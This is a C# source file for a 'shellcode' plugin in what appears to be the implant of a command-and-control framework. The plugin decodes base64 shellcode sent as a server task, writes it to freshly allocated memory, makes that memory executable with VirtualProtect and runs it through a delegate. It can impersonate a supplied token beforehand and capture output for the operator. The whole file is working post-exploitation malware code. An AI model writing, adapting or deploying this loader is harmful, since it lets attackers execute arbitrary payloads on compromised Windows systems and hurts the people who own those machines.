using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Net.NetworkInformation;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "shellcode";
        private delegate void BufferDelegate();
        private enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        const long VirtPro = 65467780416196;
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            bool output = false;

            bool.TryParse(args["get_output"], out output);

            if (messageManager.StdIsBusy() && output)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x20" } },
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            byte[] buffer = Convert.FromBase64String(args["buffer"].ToString());

            //Allocate shellcode as RW
            IntPtr bufAddr = Native.VirtualAlloc(IntPtr.Zero, (uint)buffer.Length, 0x1000, 0x04);

            if (bufAddr == IntPtr.Zero)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = true,
                    user_output = $"err VirtualAlloc ({Marshal.GetLastPInvokeError()})",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            Marshal.Copy(buffer, 0, bufAddr, buffer.Length);

            uint oldProtect;
            if (!Native.VirtualProtect(bufAddr, (uint)buffer.Length, 0x20, out oldProtect))
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = true,
                    user_output = $"err VirtualProtect ({Marshal.GetLastPInvokeError()})",
                    task_id = job.task.id,
                    status = "success"
                });
                return;
            }

            // Create a delegate to the shellcode
            BufferDelegate shellcodeDelegate = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(bufAddr, typeof(BufferDelegate));

            if (output)
            {
                if (!messageManager.CaptureStdOut(args["task-id"]))
                {
                    await messageManager.AddResponse(new ResponseResult()
                    {
                        completed = true,
                        process_response = new Dictionary<string, string> { { "message", "0x20" } },
                        task_id = args["task-id"],
                        status = "success"
                    });
                    return;
                }
            }
            await messageManager.AddResponse(new ResponseResult()
            {
                completed = false,
                process_response = new Dictionary<string, string> { { "message", "0x44" } },
                task_id = job.task.id,
                status = "success"
            });

            // Execute the shellcode using the delegate
            try
            {
                shellcodeDelegate.Invoke();
            }
            catch (Exception e)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    completed = true,
                    user_output = $"Error in buffer: {e.ToString()}\r\nWin32: {Marshal.GetLastPInvokeError()}",
                    task_id = job.task.id,
                    status = "success"
                });
            }

            if (output)
            {
                messageManager.ReleaseStdOut();
            }

            await messageManager.AddResponse(new ResponseResult()
            {
                completed = true,
                process_response = new Dictionary<string, string> { { "message", "0x35" } },
                task_id = job.task.id,
                status = "success"
            });
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
    }
}